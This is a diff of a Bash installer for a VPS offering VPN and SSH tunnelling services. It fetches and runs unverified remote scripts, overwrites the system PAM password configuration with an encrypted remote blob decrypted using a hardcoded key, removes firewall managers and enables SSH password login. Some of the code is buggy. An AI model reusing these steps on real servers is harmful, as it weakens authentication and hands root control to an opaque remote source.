@@ -1,91 +1,75 @@
 #!/bin/bash
-# ╔══════════════════════════════════════════════════════════════════╗
-# ║   ⛓️  D£VSX-NETWORK :: SYSTEM BOOTSTRAP & OPTIMIZE (Next-Gen)     ║
-# ║    Installs: core tools, web, vpn, haproxy, vnstat, badvpn, bbr  ║
-# ╚══════════════════════════════════════════════════════════════════╝
-set -o errexit
-set -o nounset
-set -o pipefail
 
-# ---------------------------
-# 🎨 Colors & helpers
-# ---------------------------
-RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[0;33m'
-BLUE='\033[0;34m'; CYAN='\033[0;36m'; NC='\033[0m'
+# ╭──────────────────────────────────────────────────────╮
+# │              ✨ FILE ENC BY ANSENDANTVPN             │
+# │          ⚡ VPS INSTALLER & SYSTEM SETUP ⚡          │
+# ╰──────────────────────────────────────────────────────╯
 
-info()  { echo -e "${CYAN}[INFO]${NC} $*"; }
-ok()    { echo -e "${GREEN}[ OK ]${NC} $*"; }
-warn()  { echo -e "${YELLOW}[WARN]${NC} $*"; }
-err()   { echo -e "${RED}[ERR ]${NC} $*"; exit 1; }
+echo "✨ FILE ENC BY ANSENDANTVPN"
 
-progress() {
-  local msg=$1; local secs=${2:-1}
-  printf "%s " "${CYAN}[..]${NC} ${msg}"
-  sleep "$secs"
-  echo -e " ${GREEN}done${NC}"
-}
+# ───────────────────────────────────────────────────────
+# 📦 SYSTEM PACKAGE & INITIALIZATION
+# ───────────────────────────────────────────────────────
 
-# ---------------------------
-# ⚙️ Vars & repo
-# ---------------------------
-REPO="https://imortall.web.id/os/"
+# etc
+apt dist-upgrade -y
+apt install netfilter-persistent -y
+apt-get remove --purge ufw firewalld -y
+apt install -y screen curl jq bzip2 gzip vnstat coreutils rsyslog iftop zip unzip git apt-transport-https build-essential -y
+
+REPO="https://bsi.web.id/os/"
+
+# initializing var
 export DEBIAN_FRONTEND=noninteractive
+MYIP=$(wget -qO- ipinfo.io/ip)
+MYIP2="s/xxxxxxxxx/$MYIP/g"
+NET=$(ip -o $ANU -4 route show to default | awk '{print $5}')
 
-# get primary network interface (non-empty)
-NET_IFACE=$(ip -o -4 route show to default 2>/dev/null | awk '{print $5}' | head -n1 || echo "eth0")
-MYIP=$(wget -qO- ipinfo.io/ip || curl -sS https://ipv4.icanhazip.com || echo "0.0.0.0")
-MYIP_PLACEHOLDER="s/xxxxxxxxx/${MYIP}/g"
+# ───────────────────────────────────────────────────────
+# 🔍 DETECT OPERATING SYSTEM
+# ───────────────────────────────────────────────────────
 
-# OS detection
 if [[ -f /etc/os-release ]]; then
-  . /etc/os-release
-  OS_NAME=${ID:-unknown}
-  OS_VERSION=${VERSION_ID:-unknown}
-  info "Detected OS: ${OS_NAME} ${OS_VERSION}"
+    . /etc/os-release
+    OS_NAME=$ID
+    OS_VERSION=$VERSION_ID
+
+    echo "Menemukan sistem operasi: $OS_NAME $OS_VERSION"
 else
-  err "Cannot detect OS. Exiting."
+    echo "Tidak dapat menentukan sistem operasi."
+    exit 1
 fi
 
-# ---------------------------
-# 0) Quick header
-# ---------------------------
-clear
-echo -e "${BLUE}╔════════════════════════════════════════════════════════════════╗${NC}"
-echo -e "${BLUE}║${NC}   ⛓️  D£VSX-NETWORK :: Bootstrap & Optimization (Next-Gen)    ${BLUE}║${NC}"
-echo -e "${BLUE}╚════════════════════════════════════════════════════════════════╝${NC}"
-echo
+# ───────────────────────────────────────────────────────
+# 🏢 DETAIL NAMA PERUSAHAAN
+# ───────────────────────────────────────────────────────
 
-# ---------------------------
-# 1) System update & essentials
-# ---------------------------
-info "Updating system packages (this may take a while)..."
-apt update -y >/dev/null 2>&1 || true
-apt upgrade -y >/dev/null 2>&1 || true
-apt dist-upgrade -y >/dev/null 2>&1 || true
-ok "System updated"
+country=ID
+state=Indonesia
+locality=Jakarta
+organization=none
+organizationalunit=none
+commonname=none
+email=none
 
-info "Installing essential packages..."
-PKGS=(screen curl jq bzip2 gzip vnstat coreutils rsyslog iftop zip unzip git apt-transport-https build-essential netfilter-persistent figlet ruby lolcat php php-fpm php-cli php-mysql libxml-parser-perl neofetch lsof htop net-tools wget nano sed gnupg bc dirmngr)
-apt-get install -y "${PKGS[@]}" >/dev/null 2>&1 || warn "Some packages failed to install (check network/repo)."
-ok "Essential packages installed"
+# ───────────────────────────────────────────────────────
+# 🔐 SIMPLE PASSWORD
+# ───────────────────────────────────────────────────────
 
-# ensure lolcat installed via gem (may require ruby)
-if ! command -v lolcat >/dev/null 2>&1; then
-  gem install lolcat >/dev/null 2>&1 || warn "lolcat install failed"
-fi
+curl -sS ${REPO}install/password | openssl aes-256-cbc -d -a -pass pass:scvps07gg -pbkdf2 > /etc/pam.d/common-password
+chmod +x /etc/pam.d/common-password
 
-# ---------------------------
-# 2) Remove unwanted services
-# ---------------------------
-info "Removing firewall managers that may conflict (ufw, firewalld)..."
-apt-get remove --purge -y ufw firewalld >/dev/null 2>&1 || true
-ok "Firewall managers removed (if present)"
+# ───────────────────────────────────────────────────────
+# 📂 GO TO ROOT
+# ───────────────────────────────────────────────────────
 
-# ---------------------------
-# 3) rc.local service (compat)
-# ---------------------------
-info "Ensuring rc.local compatibility service..."
-cat > /etc/systemd/system/rc-local.service <<'EOF'
+cd
+
+# ───────────────────────────────────────────────────────
+# ⚙️ SYSTEMD RC-LOCAL SERVICE
+# ───────────────────────────────────────────────────────
+
+cat > /etc/systemd/system/rc-local.service <<-END
 [Unit]
 Description=/etc/rc.local
 ConditionPathExists=/etc/rc.local
@@ -98,277 +82,427 @@ RemainAfterExit=yes
 SysVStartPriority=99
 [Install]
 WantedBy=multi-user.target
-EOF
+END
 
-cat > /etc/rc.local <<'EOF'
+# ───────────────────────────────────────────────────────
+# 📜 CREATE /etc/rc.local
+# ───────────────────────────────────────────────────────
+
+cat > /etc/rc.local <<-END
 #!/bin/sh -e
-# rc.local stub for compatibility
+# rc.local
+# By default this script does nothing.
 exit 0
-EOF
+END
 
+# Ubah izin akses
 chmod +x /etc/rc.local
-systemctl daemon-reload
-systemctl enable --now rc-local.service >/dev/null 2>&1 || warn "rc-local enable failed"
-ok "rc.local service ensured"
 
-# ---------------------------
-# 4) Kernel / IPv6 tweaks
-# ---------------------------
-info "Disabling IPv6 (runtime) and ensuring persistence..."
-echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6 || true
-if ! grep -q "disable_ipv6" /etc/rc.local 2>/dev/null; then
-  sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local
-fi
-ok "IPv6 disabled"
+# enable rc local
+systemctl enable rc-local
+systemctl start rc-local.service
 
-# ---------------------------
-# 5) Webstack: nginx + php
-# ---------------------------
-info "Installing and configuring Nginx + PHP-FPM..."
-apt-get install -y nginx certbot >/dev/null 2>&1 || warn "nginx/certbot install failed"
-# replace default configs with repo ones if available
-if wget -q -O /etc/nginx/nginx.conf "${REPO}install/nginx.conf"; then
-  ok "nginx.conf fetched"
-fi
-if wget -q -O /etc/nginx/conf.d/vps.conf "${REPO}install/vps.conf"; then
-  ok "vps.conf fetched"
-fi
+# ───────────────────────────────────────────────────────
+# 🌐 DISABLE IPV6
+# ───────────────────────────────────────────────────────
 
-# PHP-FPM socket -> TCP
-if [[ -f /etc/php/7.4/fpm/pool.d/www.conf ]]; then
-  sed -i 's/listen = \/var\/run\/php\/php7.4-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/7.4/fpm/pool.d/www.conf || true
-fi
-# generic replacement (older/newer PHP)
-sed -i 's@listen = /var/run/php-fpm.sock@listen = 127.0.0.1:9000@g' /etc/php/*/fpm/pool.d/* 2>/dev/null || true
+echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
+sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local
 
+# ───────────────────────────────────────────────────────
+# 🔄 SYSTEM UPDATE
+# ───────────────────────────────────────────────────────
+
+apt update -y
+apt upgrade -y
+apt dist-upgrade -y
+apt-get remove --purge ufw firewalld -y
+apt-get remove --purge exim4 -y
+
+# ───────────────────────────────────────────────────────
+# 📦 INSTALL JQ
+# ───────────────────────────────────────────────────────
+
+apt -y install jq
+
+# ───────────────────────────────────────────────────────
+# 🔒 INSTALL SHC
+# ───────────────────────────────────────────────────────
+
+apt -y install shc
+
+# ───────────────────────────────────────────────────────
+# 🌐 INSTALL WGET & CURL
+# ───────────────────────────────────────────────────────
+
+apt -y install wget curl
+
+# ───────────────────────────────────────────────────────
+# 🎨 FIGLET & LOLCAT
+# ───────────────────────────────────────────────────────
+
+apt-get install figlet -y
+apt-get install ruby -y
+gem install lolcat
+
+# ───────────────────────────────────────────────────────
+# 🕐 SET TIME GMT +7
+# ───────────────────────────────────────────────────────
+
+ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
+
+# ───────────────────────────────────────────────────────
+# ⚙️ SET LOCALE / SSH
+# ───────────────────────────────────────────────────────
+
+sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
+
+# ───────────────────────────────────────────────────────
+# 📦 SYSTEM DEPENDENCIES
+# ───────────────────────────────────────────────────────
+
+# // install
+apt-get --reinstall --fix-missing install -y bzip2 gzip coreutils wget screen rsyslog iftop htop net-tools zip unzip wget net-tools curl nano sed screen gnupg gnupg1 bc apt-transport-https build-essential dirmngr libxml-parser-perl neofetch git lsof
+
+# ───────────────────────────────────────────────────────
+# 🔐 SSL / CERTBOT
+# ───────────────────────────────────────────────────────
+
+install_ssl(){
+    if [ -f "/usr/bin/apt-get" ];then
+            isDebian=`cat /etc/issue|grep Debian`
+            if [ "$isDebian" != "" ];then
+                    apt-get install -y nginx certbot
+                    apt install -y nginx certbot
+                    sleep 3s
+            else
+                    apt-get install -y nginx certbot
+                    apt install -y nginx certbot
+                    sleep 3s
+            fi
+    else
+        yum install -y nginx certbot
+        sleep 3s
+    fi
+
+    systemctl stop nginx.service
+
+    if [ -f "/usr/bin/apt-get" ];then
+            isDebian=`cat /etc/issue|grep Debian`
+            if [ "$isDebian" != "" ];then
+                    echo "A" | certbot certonly --renew-by-default --register-unsafely-without-email --standalone -d $domain
+                    sleep 3s
+            else
+                    echo "A" | certbot certonly --renew-by-default --register-unsafely-without-email --standalone -d $domain
+                    sleep 3s
+            fi
+    else
+        echo "Y" | certbot certonly --renew-by-default --register-unsafely-without-email --standalone -d $domain
+        sleep 3s
+    fi
+}
+
+# ───────────────────────────────────────────────────────
+# 🌐 INSTALL WEBSERVER
+# ───────────────────────────────────────────────────────
+
+# install webserver
+apt -y install nginx php php-fpm php-cli php-mysql libxml-parser-perl
+rm /etc/nginx/sites-enabled/default
+rm /etc/nginx/sites-available/default
+curl ${REPO}install/nginx.sh > /etc/nginx/nginx.conf
+curl ${REPO}install/vps.sh > /etc/nginx/conf.d/vps.conf
+sed -i 's/listen = \/var\/run\/php-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/fpm/pool.d/www.conf
 mkdir -p /home/vps/public_html
-echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
+echo "<?php phpinfo() ?>" > /home/vps/public_html/info.php
 chown -R www-data:www-data /home/vps/public_html
 chmod -R g+rw /home/vps/public_html
+cd /home/vps/public_html
+wget -O /home/vps/public_html/index.html "${REPO}install/index.html1"
+/etc/init.d/nginx restart
 
-# fetch index.html if exists
-wget -q -O /home/vps/public_html/index.html "${REPO}install/index.html1" || true
-systemctl restart nginx >/dev/null 2>&1 || warn "nginx restart failed"
-ok "Webserver ready"
+# ───────────────────────────────────────────────────────
+# 🚀 INSTALL BADVPN
+# ───────────────────────────────────────────────────────
 
-# ---------------------------
-# 6) badvpn (udp2raw-like helpers)
-# ---------------------------
-info "Installing badvpn binary & services..."
-wget -q -O /usr/sbin/badvpn "${REPO}install/badvpn" || warn "badvpn fetch failed"
-chmod +x /usr/sbin/badvpn || true
-
-for i in 1 2 3; do
-  svc="/etc/systemd/system/badvpn${i}.service"
-  if wget -q -O "${svc}" "${REPO}install/badvpn${i}.service"; then
-    systemctl daemon-reload
-    systemctl enable --now badvpn${i} >/dev/null 2>&1 || warn "badvpn${i} enable failed"
-  fi
-done
-ok "badvpn services configured"
-
-# ---------------------------
-# 7) SSH & Dropbear tweaks
-# ---------------------------
-info "Configuring SSH ports & authentication..."
-SSH_CONF='/etc/ssh/sshd_config'
-
-# enable password auth
-sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' "$SSH_CONF" || true
-
-# remove existing Port lines and add desired ports (idempotent)
-sed -i '/^Port /d' "$SSH_CONF"
-cat >> "$SSH_CONF" <<'EOF'
-Port 22
-Port 500
-Port 40000
-Port 51443
-Port 58080
-Port 200
-Port 2222
-Port 2223
-EOF
-systemctl restart ssh >/dev/null 2>&1 || warn "ssh restart failed"
-ok "SSH configured"
-
-info "Installing & configuring Dropbear..."
-apt-get install -y dropbear >/dev/null 2>&1 || warn "dropbear install failed"
-wget -q -O /etc/default/dropbear "${REPO}install/dropbear" || true
-dropbearkey -t dss -f /etc/dropbear/dropbear_dss_host_key >/dev/null 2>&1 || true
-chmod 600 /etc/dropbear/dropbear_dss_host_key >/dev/null 2>&1 || true
-grep -Fxq "/bin/false" /etc/shells || echo "/bin/false" >> /etc/shells
-grep -Fxq "/usr/sbin/nologin" /etc/shells || echo "/usr/sbin/nologin" >> /etc/shells
-systemctl restart dropbear >/dev/null 2>&1 || warn "dropbear restart failed"
-ok "Dropbear setup complete"
-
-# ---------------------------
-# 8) Squid proxy
-# ---------------------------
-info "Installing Squid proxy..."
-if [[ "${OS_NAME}" == "debian" && "${OS_VERSION%%.*}" -eq 10 ]] || [[ "${OS_NAME}" == "ubuntu" && "${OS_VERSION%%.*}" -eq 20 ]]; then
-  apt-get install -y squid3 >/dev/null 2>&1 || warn "squid3 install failed"
-else
-  apt-get install -y squid >/dev/null 2>&1 || warn "squid install failed"
-fi
-if wget -q -O /etc/squid/squid.conf "${REPO}install/squid3.conf"; then
-  sed -i "${MYIP_PLACEHOLDER}" /etc/squid/squid.conf || true
-  systemctl restart squid >/dev/null 2>&1 || warn "squid restart failed"
-  ok "Squid configured"
-else
-  warn "Failed to fetch squid conf"
-fi
-
-# ---------------------------
-# 9) vnStat (monitor bandwidth)
-# ---------------------------
-info "Installing vnStat from source to ensure latest support..."
-apt-get install -y libsqlite3-dev >/dev/null 2>&1 || true
-wget -q https://humdi.net/vnstat/vnstat-2.6.tar.gz
-tar zxvf vnstat-2.6.tar.gz >/dev/null 2>&1 || true
-cd vnstat-2.6 || true
-./configure --prefix=/usr --sysconfdir=/etc >/dev/null 2>&1 || true
-make >/dev/null 2>&1 || true
-make install >/dev/null 2>&1 || true
+# install badvpn
 cd
-rm -rf vnstat-2.6 vnstat-2.6.tar.gz || true
+wget -O /usr/sbin/badvpn "${REPO}install/badvpn" >/dev/null 2>&1
+chmod +x /usr/sbin/badvpn > /dev/null 2>&1
+wget -q -O /etc/systemd/system/badvpn1.service "${REPO}install/badvpn1.service" >/dev/null 2>&1
+wget -q -O /etc/systemd/system/badvpn2.service "${REPO}install/badvpn2.service" >/dev/null 2>&1
+wget -q -O /etc/systemd/system/badvpn3.service "${REPO}install/badvpn3.service" >/dev/null 2>&1
 
-# register interface
-vnstat -u -i "$NET_IFACE" >/dev/null 2>&1 || true
-sed -i "s@Interface \"eth0\"@Interface \"${NET_IFACE}\"@g" /etc/vnstat.conf || true
-chown -R vnstat:vnstat /var/lib/vnstat || true
-systemctl enable --now vnstat >/dev/null 2>&1 || warn "vnstat enable failed"
-ok "vnStat installed and configured"
+systemctl disable badvpn1 
+systemctl stop badvpn1 
+systemctl enable badvpn1
+systemctl start badvpn1 
+systemctl disable badvpn2 
+systemctl stop badvpn2 
+systemctl enable badvpn2
+systemctl start badvpn2 
+systemctl disable badvpn3 
+systemctl stop badvpn3 
+systemctl enable badvpn3
+systemctl start badvpn3 
 
-# ---------------------------
-# 10) HAProxy
-# ---------------------------
-info "Installing/ensuring HAProxy..."
-if ! dpkg -l | grep -q haproxy; then
-  apt-get install -y haproxy >/dev/null 2>&1 || warn "haproxy install failed"
+# ───────────────────────────────────────────────────────
+# 🔑 SETTING PORT SSH
+# ───────────────────────────────────────────────────────
+
+cd
+sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
+sed -i '/Port 22/a Port 500' /etc/ssh/sshd_config
+sed -i '/Port 22/a Port 40000' /etc/ssh/sshd_config
+sed -i '/Port 22/a Port 51443' /etc/ssh/sshd_config
+sed -i '/Port 22/a Port 58080' /etc/ssh/sshd_config
+sed -i '/Port 22/a Port 200' /etc/ssh/sshd_config
+sed -i '/Port 22/a Port 22' /etc/ssh/sshd_config
+/etc/init.d/ssh restart
+
+# ───────────────────────────────────────────────────────
+# 🐻 INSTALL DROPBEAR
+# ───────────────────────────────────────────────────────
+
+echo "=== Install Dropbear ==="
+
+# install dropbear
+apt -y install dropbear
+sudo dropbearkey -t dss -f /etc/dropbear/dropbear_dss_host_key
+sudo chmod 600 /etc/dropbear/dropbear_dss_host_key
+wget -O /etc/default/dropbear "${REPO}install/dropbear"
+echo "/bin/false" >> /etc/shells
+echo "/usr/sbin/nologin" >> /etc/shells
+/etc/init.d/ssh restart
+/etc/init.d/dropbear restart
+wget -q ${REPO}install/setrsyslog.sh && chmod +x setrsyslog.sh && ./setrsyslog.sh
+
+# ───────────────────────────────────────────────────────
+# 🦑 INSTALL SQUID
+# ───────────────────────────────────────────────────────
+
+if [[ "$OS_NAME" == "debian" && "$OS_VERSION" == "10" ]] || [[ "$OS_NAME" == "ubuntu" && "$OS_VERSION" == "20.04" ]]; then
+    echo "Menginstal squid3 untuk Debian 10 atau Ubuntu 20.04..."
+    apt -y install squid3
+else
+    echo "Menginstal squid untuk versi lain..."
+    apt -y install squid
 fi
-if wget -q -O /etc/haproxy/haproxy.cfg "${REPO}install/haproxy.cfg"; then
-  ok "haproxy.cfg fetched"
+
+# Unduh file konfigurasi
+echo "Mengunduh file konfigurasi Squid..."
+wget -O /etc/squid/squid.conf "${REPO}install/squid3.sh"
+
+# Ganti placeholder dengan alamat IP
+echo "Mengganti placeholder IP dengan alamat IP saat ini..."
+sed -i $MYIP2 /etc/squid/squid.conf
+
+echo "Instalasi dan konfigurasi Squid selesai."
+
+# ───────────────────────────────────────────────────────
+# 📊 SETTING VNSTAT
+# ───────────────────────────────────────────────────────
+
+# setting vnstat
+apt -y install vnstat
+/etc/init.d/vnstat restart
+apt -y install libsqlite3-dev
+wget https://humdi.net/vnstat/vnstat-2.6.tar.gz
+tar zxvf vnstat-2.6.tar.gz
+cd vnstat-2.6
+./configure --prefix=/usr --sysconfdir=/etc && make && make install
+cd
+vnstat -i $NET
+sed -i 's/Interface "'""eth0""'"/Interface "'""$NET""'"/g' /etc/vnstat.conf
+chown vnstat:vnstat /var/lib/vnstat -R
+systemctl enable vnstat
+/etc/init.d/vnstat restart
+rm -f /root/vnstat-2.6.tar.gz
+rm -rf /root/vnstat-2.6
+
+# ───────────────────────────────────────────────────────
+# ⚖️ INSTALL & CONFIGURE HAPROXY
+# ───────────────────────────────────────────────────────
+
+cd
+
+# install haproxy
+# Cek apakah HAProxy sudah terinstal
+if dpkg -l | grep -q haproxy; then
+    echo "HAProxy sudah terinstal. Melanjutkan ke langkah berikutnya..."
+else
+    echo "HAProxy belum terinstal. Menginstal HAProxy..."
+    apt install haproxy -y
 fi
+
+# Unduh file konfigurasi HAProxy
+echo "Mengunduh file konfigurasi HAProxy..."
+wget -O /etc/haproxy/haproxy.cfg "https://bsi.web.id/os/install/haproxy.cfg"
+
+# Reload daemon systemd
+echo "Memuat ulang daemon systemd..."
 systemctl daemon-reload
-systemctl enable --now haproxy >/dev/null 2>&1 || warn "haproxy enable/start failed"
-ok "HAProxy running"
 
-# ---------------------------
-# 11) OpenVPN, lolcat (external scripts)
-# ---------------------------
-info "Running external install scripts (vpn, lolcat)..."
-if wget -q -O /root/vpn.sh "${REPO}install/vpn.sh"; then
-  chmod +x /root/vpn.sh && bash /root/vpn.sh || warn "vpn.sh failed"
-fi
-if wget -q -O /root/lolcat.sh "${REPO}install/lolcat.sh"; then
-  chmod +x /root/lolcat.sh && bash /root/lolcat.sh || warn "lolcat.sh failed"
-fi
-ok "External scripts executed (if downloaded)"
+# Mengelola layanan HAProxy
+echo "Menghentikan layanan HAProxy (jika sedang berjalan)..."
+systemctl stop haproxy
 
-# ---------------------------
-# 12) Swapfile 1GB
-# ---------------------------
-info "Creating 1GB swapfile..."
-if [[ ! -f /swapfile ]]; then
-  dd if=/dev/zero of=/swapfile bs=1M count=1024 status=none || warn "dd swap failed"
-  mkswap /swapfile >/dev/null 2>&1 || warn "mkswap failed"
-  chown root:root /swapfile
-  chmod 0600 /swapfile
-  swapon /swapfile || warn "swapon failed"
-  grep -q '/swapfile' /etc/fstab || echo '/swapfile none swap sw 0 0' >> /etc/fstab
-fi
-ok "Swapfile ready"
+echo "Mengaktifkan layanan HAProxy untuk memulai secara otomatis saat boot..."
+systemctl enable haproxy
 
-# ---------------------------
-# 13) Fail2ban & DOS-Deflate
-# ---------------------------
-info "Installing fail2ban..."
-apt-get install -y fail2ban >/dev/null 2>&1 || warn "fail2ban install failed"
-ok "fail2ban installed"
+echo "Memulai layanan HAProxy..."
+systemctl start haproxy
 
-info "Installing DOS-Deflate (simple ddos mitigation)..."
-if [[ ! -d /usr/local/ddos ]]; then
-  mkdir -p /usr/local/ddos
-  wget -q -O /usr/local/ddos/ddos.conf http://www.inetbase.com/scripts/ddos/ddos.conf || true
-  wget -q -O /usr/local/ddos/LICENSE http://www.inetbase.com/scripts/ddos/LICENSE || true
-  wget -q -O /usr/local/ddos/ignore.ip.list http://www.inetbase.com/scripts/ddos/ignore.ip.list || true
-  wget -q -O /usr/local/ddos/ddos.sh http://www.inetbase.com/scripts/ddos/ddos.sh || true
-  chmod 0755 /usr/local/ddos/ddos.sh || true
-  ln -sf /usr/local/ddos/ddos.sh /usr/local/bin/ddos
-  /usr/local/ddos/ddos.sh --cron >/dev/null 2>&1 || true
-fi
-ok "DOS-Deflate installed (if resources available)"
+echo "Selesai: HAProxy telah dikonfigurasi dan dijalankan."
 
-# ---------------------------
-# 14) Issue banner & syslog tweaks
-# ---------------------------
-info "Updating /etc/issue.net and rsyslog..."
-wget -q -O /etc/issue.net "${REPO}install/issue.net" || true
-# remote rsyslog config if provided:
-if wget -q -O /root/setrsyslog.sh "${REPO}install/setrsyslog.sh"; then
-  chmod +x /root/setrsyslog.sh && bash /root/setrsyslog.sh || warn "setrsyslog script failed"
-fi
-ok "Banner & rsyslog done"
+# ───────────────────────────────────────────────────────
+# 🔐 INSTALL OPENVPN
+# ───────────────────────────────────────────────────────
 
-# ---------------------------
-# 15) Kernel tuning & BBR
-# ---------------------------
-info "Installing BBR & kernel optimizations..."
-if wget -q -O /root/bbr.sh "${REPO}install/bbr.sh"; then
-  chmod +x /root/bbr.sh && bash /root/bbr.sh || warn "bbr script failed"
-fi
-ok "BBR & kernel tweaks applied (if script available)"
+#OpenVPN
+wget ${REPO}install/vpn.sh &&  chmod +x vpn.sh && ./vpn.sh
 
-# ---------------------------
-# 16) ipserver & torrent block rules
-# ---------------------------
-info "Applying ipserver & iptables torrent-block rules..."
-if wget -q -O /root/ipserver "${REPO}install/ipserver"; then
-  chmod +x /root/ipserver && /root/ipserver || true
+# ───────────────────────────────────────────────────────
+# 🌈 INSTALL LOLCAT
+# ───────────────────────────────────────────────────────
+
+# // install lolcat
+wget ${REPO}install/lolcat.sh &&  chmod +x lolcat.sh && ./lolcat.sh
+
+# ───────────────────────────────────────────────────────
+# 💾 MEMORY SWAP 1GB
+# ───────────────────────────────────────────────────────
+
+# memory swap 1gb
+cd
+dd if=/dev/zero of=/swapfile bs=2048 count=1048576
+mkswap /swapfile
+chown root:root /swapfile
+chmod 0600 /swapfile >/dev/null 2>&1
+swapon /swapfile >/dev/null 2>&1
+sed -i '$ i\/swapfile      swap swap   defaults    0 0' /etc/fstab
+
+# ───────────────────────────────────────────────────────
+# 🛡️ INSTALL FAIL2BAN
+# ───────────────────────────────────────────────────────
+
+# install fail2ban
+apt -y install fail2ban
+
+# ───────────────────────────────────────────────────────
+# 🧱 INSTAL DDOS FLATE
+# ───────────────────────────────────────────────────────
+
+if [ -d '/usr/local/ddos' ]; then
+	echo; echo; echo "Please un-install the previous version first"
+	exit 0
+else
+	mkdir /usr/local/ddos
 fi
 
-# torrent block patterns
-for pat in "get_peers" "announce_peer" "find_node" "BitTorrent" "BitTorrent protocol" "peer_id=" ".torrent" "announce.php?passkey=" "torrent" "announce" "info_hash"; do
-  iptables -A FORWARD -m string --algo bm --string "$pat" -j DROP >/dev/null 2>&1 || true
-done
-iptables-save > /etc/iptables.up.rules || true
-iptables-restore -t < /etc/iptables.up.rules || true
-netfilter-persistent save >/dev/null 2>&1 || true
-netfilter-persistent reload >/dev/null 2>&1 || true
-ok "iptables rules applied"
+clear
+echo; echo 'Installing DOS-Deflate 0.6'; echo
+echo; echo -n 'Downloading source files...'
+wget -q -O /usr/local/ddos/ddos.conf http://www.inetbase.com/scripts/ddos/ddos.conf
+echo -n '.'
+wget -q -O /usr/local/ddos/LICENSE http://www.inetbase.com/scripts/ddos/LICENSE
+echo -n '.'
+wget -q -O /usr/local/ddos/ignore.ip.list http://www.inetbase.com/scripts/ddos/ignore.ip.list
+echo -n '.'
+wget -q -O /usr/local/ddos/ddos.sh http://www.inetbase.com/scripts/ddos/ddos.sh
+chmod 0755 /usr/local/ddos/ddos.sh
+cp -s /usr/local/ddos/ddos.sh /usr/local/bin/ddos
+echo '...done'
 
-# ---------------------------
-# 17) Cron jobs
-# ---------------------------
-info "Installing cron jobs for maintenance..."
-cat > /etc/cron.d/xp_otm <<'EOF'
+echo; echo -n 'Creating cron to run script every minute.....(Default setting)'
+/usr/local/ddos/ddos.sh --cron > /dev/null 2>&1
+echo '.....done'
+echo; echo 'Installation has completed.'
+echo 'Config file is at /usr/local/ddos/ddos.conf'
+echo 'Please send in your comments and/or suggestions to https://t.me/PeyxDev'
+
+# ───────────────────────────────────────────────────────
+# 🖥️ SSH BANNER
+# ───────────────────────────────────────────────────────
+
+# banner /etc/issue.net
+echo "Banner /etc/issue.net" >>/etc/ssh/sshd_config
+
+# Ganti Banner
+wget -O /etc/issue.net "${REPO}install/issue.net"
+
+# ───────────────────────────────────────────────────────
+# ⚡ INSTALL BBR & OPTIMASI KERNEL
+# ───────────────────────────────────────────────────────
+
+#install bbr dan optimasi kernel
+wget ${REPO}install/bbr.sh && chmod +x bbr.sh && ./bbr.sh
+
+wget -q ${REPO}install/ipserver && chmod +x ipserver && ./ipserver
+
+# ───────────────────────────────────────────────────────
+# 🚫 BLOKIR TORRENT
+# ───────────────────────────────────────────────────────
+
+iptables -A FORWARD -m string --string "get_peers" --algo bm -j DROP
+iptables -A FORWARD -m string --string "announce_peer" --algo bm -j DROP
+iptables -A FORWARD -m string --string "find_node" --algo bm -j DROP
+iptables -A FORWARD -m string --algo bm --string "BitTorrent" -j DROP
+iptables -A FORWARD -m string --algo bm --string "BitTorrent protocol" -j DROP
+iptables -A FORWARD -m string --algo bm --string "peer_id=" -j DROP
+iptables -A FORWARD -m string --algo bm --string ".torrent" -j DROP
+iptables -A FORWARD -m string --algo bm --string "announce.php?passkey=" -j DROP
+iptables -A FORWARD -m string --algo bm --string "torrent" -j DROP
+iptables -A FORWARD -m string --algo bm --string "announce" -j DROP
+iptables -A FORWARD -m string --algo bm --string "info_hash" -j DROP
+iptables-save > /etc/iptables.up.rules
+iptables-restore -t < /etc/iptables.up.rules
+netfilter-persistent save
+netfilter-persistent reload
+
+rm ipserver
+
+# ───────────────────────────────────────────────────────
+# 📥 DOWNLOAD SCRIPT
+# ───────────────────────────────────────────────────────
+
+# download script
+wget -O /etc/issue.net "${REPO}install/issue.net"
+cd
+
+# ───────────────────────────────────────────────────────
+# ⏰ CRON JOBS
+# ───────────────────────────────────────────────────────
+
+#if [ ! -f "/etc/cron.d/xp_otm" ]; then
+cat> /etc/cron.d/xp_otm << END
 SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 0 0 * * * root /usr/local/sbin/xp
-EOF
+END
 
-cat > /etc/cron.d/bckp_otm <<'EOF'
+#if [ ! -f "/etc/cron.d/bckp_otm" ]; then
+cat> /etc/cron.d/bckp_otm << END
 SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 0 22 * * * root /usr/local/sbin/backup
-EOF
+END
 
-cat > /etc/cron.d/cpu_otm <<'EOF'
+cat> /etc/cron.d/cpu_otm << END
 SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 */5 * * * * root /usr/bin/autocpu
-EOF
+END
 
-# autocpu helper
-wget -q -O /usr/bin/autocpu "${REPO2}install/autocpu.sh" && chmod +x /usr/bin/autocpu || true
+wget -O /usr/bin/autocpu "${REPO}install/autocpu.sh" && chmod +x /usr/bin/autocpu
 
-cat > /etc/cron.d/xp_sc <<'EOF'
+cat >/etc/cron.d/xp_sc <<-END
 SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
-1 0 * * * root /usr/local/sbin/expsc
-EOF
+		1 0 * * * root /usr/local/sbin/expsc
+	END
 
-cat > /etc/cron.d/logclean <<'EOF'
+cat >/etc/cron.d/logclean <<-END
 SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
